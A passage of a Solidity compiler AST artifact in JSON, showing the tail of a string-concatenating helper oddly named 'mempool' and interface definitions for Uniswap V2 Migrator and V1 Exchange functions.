																			"typeString": "uint256"
																		}
																	},
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": false,
																	"nodeType": "IndexAccess",
																	"src": "18130:13:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bytes1",
																		"typeString": "bytes1"
																	}
																},
																"src": "18113:30:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_bytes1",
																	"typeString": "bytes1"
																}
															},
															"id": 1648,
															"nodeType": "ExpressionStatement",
															"src": "18113:30:0"
														}
													]
												},
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 1636,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 1633,
														"name": "i",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1624,
														"src": "18072:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "<",
													"rightExpression": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 1634,
															"name": "_baseBytes",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1592,
															"src": "18074:10:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_memory_ptr",
																"typeString": "bytes memory"
															}
														},
														"id": 1635,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "length",
														"nodeType": "MemberAccess",
														"referencedDeclaration": null,
														"src": "18074:17:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "18072:19:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 1650,
												"initializationExpression": {
													"expression": {
														"argumentTypes": null,
														"id": 1631,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftHandSide": {
															"argumentTypes": null,
															"id": 1629,
															"name": "i",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1624,
															"src": "18067:1:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "Assignment",
														"operator": "=",
														"rightHandSide": {
															"argumentTypes": null,
															"hexValue": "30",
															"id": 1630,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "18069:1:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_rational_0_by_1",
																"typeString": "int_const 0"
															},
															"value": "0"
														},
														"src": "18067:3:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"id": 1632,
													"nodeType": "ExpressionStatement",
													"src": "18067:3:0"
												},
												"loopExpression": {
													"expression": {
														"argumentTypes": null,
														"id": 1638,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"nodeType": "UnaryOperation",
														"operator": "++",
														"prefix": false,
														"src": "18093:3:0",
														"subExpression": {
															"argumentTypes": null,
															"id": 1637,
															"name": "i",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1624,
															"src": "18093:1:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"id": 1639,
													"nodeType": "ExpressionStatement",
													"src": "18093:3:0"
												},
												"nodeType": "ForStatement",
												"src": "18063:92:0"
											},
											{
												"body": {
													"id": 1671,
													"nodeType": "Block",
													"src": "18204:58:0",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 1669,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"baseExpression": {
																		"argumentTypes": null,
																		"id": 1662,
																		"name": "_newValue",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1617,
																		"src": "18219:9:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bytes_memory_ptr",
																			"typeString": "bytes memory"
																		}
																	},
																	"id": 1665,
																	"indexExpression": {
																		"argumentTypes": null,
																		"id": 1664,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"nodeType": "UnaryOperation",
																		"operator": "++",
																		"prefix": false,
																		"src": "18229:3:0",
																		"subExpression": {
																			"argumentTypes": null,
																			"id": 1663,
																			"name": "j",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 1627,
																			"src": "18229:1:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": true,
																	"nodeType": "IndexAccess",
																	"src": "18219:14:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bytes1",
																		"typeString": "bytes1"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"baseExpression": {
																		"argumentTypes": null,
																		"id": 1666,
																		"name": "_valueBytes",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1599,
																		"src": "18236:11:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bytes_memory_ptr",
																			"typeString": "bytes memory"
																		}
																	},
																	"id": 1668,
																	"indexExpression": {
																		"argumentTypes": null,
																		"id": 1667,
																		"name": "i",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1624,
																		"src": "18248:1:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": false,
																	"nodeType": "IndexAccess",
																	"src": "18236:14:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bytes1",
																		"typeString": "bytes1"
																	}
																},
																"src": "18219:31:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_bytes1",
																	"typeString": "bytes1"
																}
															},
															"id": 1670,
															"nodeType": "ExpressionStatement",
															"src": "18219:31:0"
														}
													]
												},
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 1658,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 1655,
														"name": "i",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1624,
														"src": "18177:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "<",
													"rightExpression": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 1656,
															"name": "_valueBytes",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1599,
															"src": "18179:11:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_memory_ptr",
																"typeString": "bytes memory"
															}
														},
														"id": 1657,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "length",
														"nodeType": "MemberAccess",
														"referencedDeclaration": null,
														"src": "18179:18:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "18177:20:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 1672,
												"initializationExpression": {
													"expression": {
														"argumentTypes": null,
														"id": 1653,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftHandSide": {
															"argumentTypes": null,
															"id": 1651,
															"name": "i",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1624,
															"src": "18172:1:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "Assignment",
														"operator": "=",
														"rightHandSide": {
															"argumentTypes": null,
															"hexValue": "30",
															"id": 1652,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "18174:1:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_rational_0_by_1",
																"typeString": "int_const 0"
															},
															"value": "0"
														},
														"src": "18172:3:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"id": 1654,
													"nodeType": "ExpressionStatement",
													"src": "18172:3:0"
												},
												"loopExpression": {
													"expression": {
														"argumentTypes": null,
														"id": 1660,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"nodeType": "UnaryOperation",
														"operator": "++",
														"prefix": false,
														"src": "18199:3:0",
														"subExpression": {
															"argumentTypes": null,
															"id": 1659,
															"name": "i",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1624,
															"src": "18199:1:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"id": 1661,
													"nodeType": "ExpressionStatement",
													"src": "18199:3:0"
												},
												"nodeType": "ForStatement",
												"src": "18168:94:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 1675,
															"name": "_newValue",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1617,
															"src": "18289:9:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_memory_ptr",
																"typeString": "bytes memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bytes_memory_ptr",
																"typeString": "bytes memory"
															}
														],
														"id": 1674,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "ElementaryTypeNameExpression",
														"src": "18282:6:0",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_string_storage_ptr_$",
															"typeString": "type(string storage pointer)"
														},
														"typeName": {
															"id": 1673,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "18282:6:0",
															"typeDescriptions": {
																"typeIdentifier": null,
																"typeString": null
															}
														}
													},
													"id": 1676,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "typeConversion",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "18282:17:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"functionReturnParameters": 1590,
												"id": 1677,
												"nodeType": "Return",
												"src": "18275:24:0"
											}
										]
									},
									"documentation": null,
									"id": 1679,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "mempool",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1587,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1584,
												"mutability": "mutable",
												"name": "_base",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1679,
												"src": "17689:19:0",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 1583,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "17689:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1586,
												"mutability": "mutable",
												"name": "_value",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1679,
												"src": "17710:20:0",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 1585,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "17710:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "17688:43:0"
									},
									"returnParameters": {
										"id": 1590,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1589,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1679,
												"src": "17755:13:0",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 1588,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "17755:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "17754:15:0"
									},
									"scope": 1680,
									"src": "17672:635:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								}
							],
							"scope": 1681,
							"src": "428:17885:0"
						}
					],
					"src": "0:18315:0"
				},
				"id": 0
			},
			"https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/IUniswapV2Migrator.sol": {
				"ast": {
					"absolutePath": "https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/IUniswapV2Migrator.sol",
					"exportedSymbols": {
						"IUniswapV2Migrator": [
							1696
						]
					},
					"id": 1697,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1682,
							"literals": [
								"solidity",
								">=",
								"0.5",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "0:24:1"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "interface",
							"documentation": null,
							"fullyImplemented": false,
							"id": 1696,
							"linearizedBaseContracts": [
								1696
							],
							"name": "IUniswapV2Migrator",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"body": null,
									"documentation": null,
									"functionSelector": "b7df1d25",
									"id": 1695,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "migrate",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1693,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1684,
												"mutability": "mutable",
												"name": "token",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1695,
												"src": "78:13:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1683,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "78:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1686,
												"mutability": "mutable",
												"name": "amountTokenMin",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1695,
												"src": "93:19:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1685,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "93:4:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1688,
												"mutability": "mutable",
												"name": "amountETHMin",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1695,
												"src": "114:17:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1687,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "114:4:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1690,
												"mutability": "mutable",
												"name": "to",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1695,
												"src": "133:10:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1689,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "133:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1692,
												"mutability": "mutable",
												"name": "deadline",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1695,
												"src": "145:13:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1691,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "145:4:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "77:82:1"
									},
									"returnParameters": {
										"id": 1694,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "168:0:1"
									},
									"scope": 1696,
									"src": "61:108:1",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								}
							],
							"scope": 1697,
							"src": "26:145:1"
						}
					],
					"src": "0:172:1"
				},
				"id": 1
			},
			"https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Exchange.sol": {
				"ast": {
					"absolutePath": "https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Exchange.sol",
					"exportedSymbols": {
						"IUniswapV1Exchange": [
							1752
						]
					},
					"id": 1753,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1698,
							"literals": [
								"solidity",
								">=",
								"0.5",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "0:24:2"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "interface",
							"documentation": null,
							"fullyImplemented": false,
							"id": 1752,
							"linearizedBaseContracts": [
								1752
							],
							"name": "IUniswapV1Exchange",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"body": null,
									"documentation": null,
									"functionSelector": "70a08231",
									"id": 1705,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "balanceOf",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1701,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1700,
												"mutability": "mutable",
												"name": "owner",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1705,
												"src": "80:13:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1699,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "80:7:2",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "79:15:2"
									},
									"returnParameters": {
										"id": 1704,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1703,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1705,
												"src": "118:4:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1702,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "118:4:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "117:6:2"
									},
									"scope": 1752,
									"src": "61:63:2",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"functionSelector": "23b872dd",
									"id": 1716,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "transferFrom",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1712,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1707,
												"mutability": "mutable",
												"name": "from",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1716,
												"src": "151:12:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1706,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "151:7:2",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1709,
												"mutability": "mutable",
												"name": "to",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1716,
												"src": "165:10:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1708,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "165:7:2",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1711,
												"mutability": "mutable",
												"name": "value",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1716,
												"src": "177:10:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1710,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "177:4:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "150:38:2"
									},
									"returnParameters": {
										"id": 1715,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1714,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1716,
												"src": "207:4:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 1713,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "207:4:2",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "206:6:2"
									},
									"scope": 1752,
									"src": "129:84:2",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"functionSelector": "f88bf15a",
									"id": 1731,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "removeLiquidity",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1725,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1718,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1731,
												"src": "243:4:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1717,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "243:4:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1720,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1731,
												"src": "249:4:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1719,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "249:4:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1722,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1731,
												"src": "255:4:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1721,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "255:4:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1724,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1731,
												"src": "261:4:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1723,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "261:4:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "242:24:2"
									},
									"returnParameters": {
										"id": 1730,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1727,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1731,
												"src": "285:4:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1726,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "285:4:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1729,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1731,
												"src": "291:4:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1728,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "291:4:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "284:12:2"
									},
									"scope": 1752,
									"src": "218:79:2",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"functionSelector": "95e3c50b",
									"id": 1742,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "tokenToEthSwapInput",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1738,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1733,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1742,
												"src": "331:4:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1732,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "331:4:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1735,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1742,
												"src": "337:4:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1734,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "337:4:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1737,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1742,
												"src": "343:4:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1736,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "343:4:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "330:18:2"
									},
									"returnParameters": {
										"id": 1741,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1740,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1742,
												"src": "367:4:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1739,
													"name": "uint",
